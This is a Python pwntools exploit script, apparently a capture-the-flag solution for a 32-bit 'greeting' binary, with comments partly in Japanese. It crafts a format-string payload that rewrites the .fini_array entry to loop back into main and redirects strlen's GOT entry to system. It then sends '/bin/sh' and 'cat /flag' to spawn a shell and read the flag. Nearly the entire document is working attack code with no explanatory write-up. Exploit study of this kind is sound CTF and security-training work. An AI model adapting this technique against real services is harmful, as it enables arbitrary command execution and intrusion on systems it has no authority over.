#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

rhp = {'host':"localhost",'port':12301}
context(os='linux',arch='i386')
binf = ELF("./greeting")

addr_plt_system = binf.plt["system"]
addr_bin_main = binf.functions["main"].address
addr_fini_array = binf.get_section_by_name(".fini_array").header["sh_addr"]
addr_got_strlen = binf.got["strlen"]

#main      : 0x80485f6
#fini_array: 0x8049a28
#original fini_array value: 0x80485c0
#plt_system: 0x8048480
#got_strlen: 0x8049b48
#libc strlen:0xf7dc8480

def exploit(conn):
  index = 12
  nice = "Nice to meet you, "
  diff = 0xf6

  print("main      : "+hex(addr_bin_main))
  print("fini_array: "+hex(addr_fini_array))
  print("plt_system: "+hex(addr_plt_system))
  print("got_strlen: "+hex(addr_got_strlen))
  
  #align for 4 byte align of inp
  inp = "@@"  
  #overwrite fini_array into main
  #こっちで書きすぎちゃうとstrlenのplt書き換えられなくなっちゃうからここはなるべく小さく(hhn)
  inp += p32(addr_fini_array) + p32(addr_got_strlen) + p32(addr_got_strlen + 0x02)
  inp += "%" + str(diff - len(nice) - len(inp)) + "c"
  inp += "%" + str(index) + "$hhn"
  #overwrite plt of strlen into system
  inp += "%" + str(0x0804 - diff) + "c"
  inp += "%" + str(index+2) + "$hn"
  inp += "%" + str(0x8480 - 0x0804) + "c"
  inp += "%" + str(index+1) + "$hn"

  conn.recvuntil("Please tell me your name... ")
  conn.sendline(inp)
  conn.recvuntil("Please tell me your name... ")
  conn.sendline("/bin/sh")
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *main+0x46
      b *main+0x79
      c
    """
    conn = gdb.debug("./greeting",cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

